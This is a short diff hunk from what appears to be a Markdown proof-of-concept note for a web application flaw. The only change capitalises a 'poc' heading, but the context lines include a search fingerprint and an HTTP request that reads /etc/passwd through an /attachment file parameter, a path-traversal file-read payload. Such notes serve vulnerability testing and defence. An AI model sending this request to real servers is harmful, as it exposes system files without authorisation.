@@ -9,7 +9,7 @@
 body="/user/get_app_scheme?site_id="
 ```
 
-## poc
+## POC
 ```
 GET /attachment?file=/etc/passwd HTTP/1.1
 Host: your-ip
